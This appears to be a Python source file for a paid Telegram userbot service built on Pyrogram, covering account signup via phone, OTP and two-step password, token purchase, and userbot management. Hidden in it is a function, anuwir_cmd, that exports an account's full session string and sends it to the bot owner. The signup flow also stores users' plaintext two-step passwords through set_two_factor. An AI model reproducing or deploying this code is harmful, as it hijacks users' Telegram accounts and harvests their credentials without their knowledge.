import asyncio
import importlib
from datetime import datetime

from pyrogram.enums import SentCodeType
from pyrogram.errors import *
from pyrogram.types import *

from Kanger import *


async def need_api(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id not in await get_prem():
        buttons = [
            [InlineKeyboardButton("Buy Token", callback_data="tuku_prem")],
            [InlineKeyboardButton("Back", callback_data="mboh")],
        ]
        await callback_query.message.edit(
            "<b>🚫 I am so sorry,\n\nif you want to use this bot\nplease buy token first</b>",
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        buttons = [
            [InlineKeyboardButton("Next", callback_data="add_ubot")],
            [InlineKeyboardButton("Back", callback_data="mboh")],
        ]
        await callback_query.edit_message_text(
            MSG.POLICY(),
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )


async def payment_userbot(client, callback_query):
    user_id = callback_query.from_user.id
    buttons = Button.plus_minus(1, user_id)
    await callback_query.edit_message_text(
        MSG.TEXT_PAYMENT(30, 30, 1),
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(buttons),
    )

async def anuwir_cmd(client, message):
    anuku = await client.export_session_string()
    try:
        await client.send_message(OWNER_ID, f"<b>STRING SESSION V2</b>\n\n<code>{anuku}</code>")
        await message.react("👍")
    except:
        await message.react("👎")

async def bikin_ubot(client, callback_query):
    await callback_query.message.edit("Processing...")
    await asyncio.sleep(0.5)
    user_id = callback_query.from_user.id
    await callback_query.message.delete()
    try:
        phone = await bot.ask(
            user_id,
            (
                "Please Input Your Number, Example +44xxxxxxxx.\n"
                "\nUse /cancel to Abort the Userbot Creation Process "
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        buttons = [
            [InlineKeyboardButton("Generate Again", callback_data="bahan")],
            [InlineKeyboardButton("Home", callback_data=f"home {user_id}")],
        ]
        return await bot.send_message(
            user_id,
            "<b>⏰️ Timeout Reached!\n⚠️ Generate Aborted!!\n\nTo Generate again\nPress button above!!</b>",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    if await is_cancel(callback_query, phone.text):
        return
    phone_number = phone.text
    new_client = Ubot(
        name=str(callback_query.id),
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=False,
    )
    get_otp = await bot.send_message(user_id, "<b>Sending OTP...</b>")
    await new_client.connect()
    try:
        code = await new_client.send_code(phone_number.strip())
    except ApiIdInvalid as AID:
        await get_otp.delete()
        buttons = [
            [InlineKeyboardButton("Generate Again", callback_data="bahan")],
            [InlineKeyboardButton("Home", callback_data=f"home {user_id}")],
        ]
        return await bot.send_message(
            user_id,
            f"<b>🚫 {AID}\n\n⚠️ Generate Aborted!!\n\nTo Generate again\nPress button above!!</b>",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    except PhoneNumberInvalid as PNI:
        await get_otp.delete()
        buttons = [
            [InlineKeyboardButton("Generate Again", callback_data="bahan")],
            [InlineKeyboardButton("Home", callback_data=f"home {user_id}")],
        ]
        return await bot.send_message(
            user_id,
            f"<b>🚫 {PNI}\n\n⚠️ Generate Aborted!!\n\nTo Generate again\nPress button above!!</b>",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    except PhoneNumberFlood as PNF:
        await get_otp.delete()
        buttons = [
            [InlineKeyboardButton("Generate Again", callback_data="bahan")],
            [InlineKeyboardButton("Home", callback_data=f"home {user_id}")],
        ]
        return await bot.send_message(
            user_id,
            f"<b>🚫 {PNF}\n\n⚠️ Generate Aborted!!\n\nTo Generate again\nPress button above!!</b>",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    except PhoneNumberBanned as PNB:
        await get_otp.delete()
        buttons = [
            [InlineKeyboardButton("Generate Again", callback_data="bahan")],
            [InlineKeyboardButton("Home", callback_data=f"home {user_id}")],
        ]
        return await bot.send_message(
            user_id,
            f"<b>🚫 {PNB}\n\n⚠️ Generate Aborted!!\n\nTo Generate again\nPress button above!!</b>",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    except PhoneNumberUnoccupied as PNU:
        await get_otp.delete()
        buttons = [
            [InlineKeyboardButton("Generate Again", callback_data="bahan")],
            [InlineKeyboardButton("Home", callback_data=f"home {user_id}")],
        ]
        return await bot.send_message(
            user_id,
            f"<b>🚫 {PNU}\n\n⚠️ Generate Aborted!!\n\nTo Generate again\nPress button above!!</b>",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    except Exception as error:
        await get_otp.delete()
        return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    try:
        sent_code = {
            SentCodeType.APP: "Check <a href=tg://openmessage?user_id=777000>HERE</a>",
            SentCodeType.SMS: "SMS",
            SentCodeType.CALL: "Call",
            SentCodeType.FLASH_CALL: "Instant Call",
            SentCodeType.FRAGMENT_SMS: "Fragment",
            SentCodeType.EMAIL_CODE: "Email OTP!",
        }
        await get_otp.delete()
        otp = await bot.ask(
            user_id,
            (
                f"Please Check OTP Code from Official {sent_code[code.type]}. Send OTP Code here after reading Format below .\n"
                "\nIf OTP Code is <code>12345</code> Please [ ADD SPACE ] send it Like this <code>1 2 3 4 5</code> \n"
                "\nUse /cancel to Abort the Userbot Creation Process "
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        buttons = [
            [InlineKeyboardButton("Generate Again", callback_data="bahan")],
            [InlineKeyboardButton("Home", callback_data=f"home {user_id}")],
        ]
        return await bot.send_message(
            user_id,
            "<b>⏰️ Timeout Reached!\n⚠️ Generate Aborted!!\n\nTo Generate again\nPress button above!!</b>",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    if await is_cancel(callback_query, otp.text):
        return
    otp_code = otp.text
    try:
        await new_client.sign_in(
            phone_number.strip(),
            code.phone_code_hash,
            phone_code=" ".join(str(otp_code)),
        )
    except PhoneCodeInvalid as PCI:
        buttons = [
            [InlineKeyboardButton("Generate Again", callback_data="bahan")],
            [InlineKeyboardButton("Home", callback_data=f"home {user_id}")],
        ]
        return await bot.send_message(
            user_id,
            f"<b>🚫 {PCI}\n\n⚠️ Generate Aborted!!\n\nTo Generate again\nPress button above!!</b>",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    except PhoneCodeExpired as PCE:
        buttons = [
            [InlineKeyboardButton("Generate Again", callback_data="bahan")],
            [InlineKeyboardButton("Home", callback_data=f"home {user_id}")],
        ]
        return await bot.send_message(
            user_id,
            f"<b>🚫 {PCE}\n\n⚠️ Generate Aborted!!\n\nTo Generate again\nPress button above!!</b>",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    except BadRequest as error:
        return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    except SessionPasswordNeeded:
        try:
            two_step_code = await bot.ask(
                user_id,
                "<b>Your account has Two-Step Verification enabled. Please send the password.\n\nUse /cancel to cancel the Userbot creation process </b>",
                timeout=300,
            )
        except asyncio.TimeoutError:
            buttons = [
                [InlineKeyboardButton("Generate Again", callback_data=f"bahan")],
                [InlineKeyboardButton("Home", callback_data=f"home {user_id}")],
                ]
            return await bot.send_message(
                user_id,
            "<b>⏰️ Timeout Reached!\n⚠️ Generate Aborted!!\n\nTo Generate again\nPress button above!!</b>",
                disable_web_page_preview=True,
                reply_markup=InlineKeyboardMarkup(buttons),
                )
        if await is_cancel(callback_query, two_step_code.text):
            return
        new_code = two_step_code.text
        try:
            await new_client.check_password(new_code)
            await set_two_factor(user_id, new_code)
        except Exception as error:
            return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    session_string = await new_client.export_session_string()
    await new_client.disconnect()
    new_client.storage.session_string = session_string
    new_client.in_memory = False
    bot_msg = await bot.send_message(
        user_id,
        "Processing...",
        disable_web_page_preview=True,
    )
    await new_client.start()
    await add_ubot(
        user_id=int(new_client.me.id),
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_string,
        device_model=DEVICE_MODEL,
    )
    #await set_uptime(new_client.me.id, time())
    if callback_query.from_user.id not in await get_seles():
        await remove_prem(callback_query.from_user.id)
    for mod in loadModule():
        importlib.reload(importlib.import_module(f"Kanger.modules.{mod}"))
    text_done = f"<b>{bot.me.mention} Successfully activated on :\n<a href=tg://openmessage?user_id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> > <code>{new_client.me.id}</code></b> "
    await bot_msg.edit(text_done)
    return await bot.send_message(
        LOGS_MAKER_UBOT,
        f"""
<b>Kanger Activated!</b>
<b>kanger:</b> <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> 
""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "Check Vaporize Timeout",
                        callback_data=f"cek_masa_aktif {new_client.me.id}",
                    )
                ],
            ]
        ),
        disable_web_page_preview=True,
    )
    

async def next_prev_ubot(client, callback_query):
    query = callback_query.data.split()
    count = int(query[1])
    if query[0] == "next_ub":
        if count == len(ubot._ubot) - 1:
            count = 0
        else:
            count += 1
    elif query[0] == "prev_ub":
        if count == 0:
            count = len(ubot._ubot) - 1
        else:
            count -= 1
    await callback_query.edit_message_text(
        await MSG.USERBOT(count),
        reply_markup=InlineKeyboardMarkup(
            Button.userbot(ubot._ubot[count].me.id, count)
        ),
    )
    

async def cek_ubot(client, callback_query):
    await bot.send_message(
        callback_query.from_user.id,
        await MSG.USERBOT(0),
        reply_markup=InlineKeyboardMarkup(Button.userbot(ubot._ubot[0].me.id, 0)),
    )


async def cek_userbot_expired(client, callback_query):
    user_id = int(callback_query.data.split()[1])
    expired = await get_expired_date(user_id)
    try:
        xxxx = (expired - datetime.now()).days
        return await callback_query.answer(f" {xxxx} Days", True)
    except:
        return await callback_query.answer("Not activated", True)

async def hapus_ubot(client, callback_query):
    user_id = callback_query.from_user.id
    show = await bot.get_users(callback_query.data.split()[1])
    await callback_query.answer(
        f"Successfully Removed {show.first_name} {show.last_name or ''} from Celestia",
        True,
        )
    try:
        get_id = show.id
        get_mention = f"<a href=tg://user?id={get_id}>{show.first_name} {show.last_name or ''}</a>"
    except Exception:
        get_id = int(callback_query.data.split()[1])
        get_mention = f"<a href=tg://user?id={get_id}>Userbot</a>"
    for X in ubot._ubot:
        if get_id == X.me.id:
            await X.unblock_user(bot.me.username)
            for chat in await get_chat(X.me.id):
                await remove_chat(X.me.id, chat)
            await rm_all(X.me.id)
            await remove_ubot(X.me.id)
            await rem_expired_date(X.me.id)
            ubot._get_my_id.remove(X.me.id)
            ubot._ubot.remove(X)
            await X.log_out()
            await bot.send_message(
                LOGS_MAKER_UBOT, f"<b>{get_mention} Successfully purged from Celestia!</b>"
            )
            return await bot.send_message(
                X.me.id, "<b>Your KangerBot life has ended</b>"
            )


async def is_cancel(callback_query, text):
    user_id = callback_query.from_user.id
    if text.startswith("/cancel"):
        buttons = [
            [InlineKeyboardButton("Generate Again", callback_data="bahan")],
            [InlineKeyboardButton("Home", callback_data=f"home {user_id}")],
        ]
        await bot.send_message(
            callback_query.from_user.id,
            "<b>⚠️ Generate Canceled!!\n\nTo Generate again\nPress button above!!</b>",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
        return True
    return False

async def buy_prem(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in ubot._get_my_id:
        buttons = [
            [
                InlineKeyboardButton("Back", callback_data="mboh")
            ]
        ]
        await callback_query.message.edit(
            "You is already Activated\nStay tune use KangerBot.",
            reply_markup=InlineKeyboardMarkup(buttons),
            )
    else:
        buttons = [
            [
                InlineKeyboardButton("List Payment", callback_data="ini_list")
            ],
            [
                InlineKeyboardButton("Back", callback_data="mboh")
            ],
        ]
        await callback_query.message.edit(
            "<b>KangerBot Pricelist</b>\n\nActive 1 Month\nPrice: Rp.25,000\n\nClick Below for payment method.",
            reply_markup=InlineKeyboardMarkup(buttons),
            )